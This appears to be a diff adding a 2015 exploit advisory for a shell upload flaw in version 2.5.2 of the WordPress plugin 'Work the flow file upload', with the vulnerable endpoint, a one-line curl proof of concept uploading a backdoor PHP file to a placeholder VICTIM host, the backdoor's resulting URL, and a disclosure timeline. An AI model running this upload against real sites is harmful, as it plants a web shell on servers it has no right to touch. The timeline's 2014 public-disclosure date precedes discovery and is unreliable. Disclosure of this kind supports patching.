@@ -1,0 +1,64 @@
+######################
+
+# Exploit Title : Wordpress Work the flow file upload 2.5.2 Shell Upload Vulnerability
+
+# Exploit Author : Claudio Viviani
+
+
+# Software Link : https://downloads.wordpress.org/plugin/work-the-flow-file-upload.2.5.2.zip
+
+# Date : 2015-03-14
+
+# Tested on : Linux BackBox 4.0 / curl 7.35.0
+
+######################
+
+# Description:
+
+Work the Flow File Upload. Embed Html5 User File Uploads and Workflows into pages and posts. 
+Multiple file Drag and Drop upload, Image Gallery display, Reordering and Archiving.
+This two in one plugin provides shortcodes to embed front end user file upload capability and / or step by step workflow.
+
+######################
+
+# Location :  
+
+http://VICTIM/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/index.php
+
+
+######################
+
+# PoC:
+
+ curl -k -X POST -F "action=upload" -F "files=@./backdoor.php" http://VICTIM/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/index.php
+
+# Backdoor Location:
+
+ http://VICTIM/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/files/backdoor.php
+
+
+######################
+
+# Vulnerability Disclosure Timeline:
+
+2015-03-14:  Discovered vulnerability
+2015-04-03:  Vendor Notification
+2015-04-03:  Vendor Response/Feedback 
+2015-04-04:  Vendor Fix/Patch (2.5.3)
+2014-04-04:  Public Disclosure 
+
+#####################
+
+Discovered By : Claudio Viviani
+                http://www.homelab.it
+				http://ffhd.homelab.it (Free Fuzzy Hashes Database)
+				
+                info@homelab.it
+                homelabit@protonmail.ch
+
+                https://www.facebook.com/homelabit
+                https://twitter.com/homelabit
+                https://plus.google.com/+HomelabIt1/
+                https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww
+
+#####################
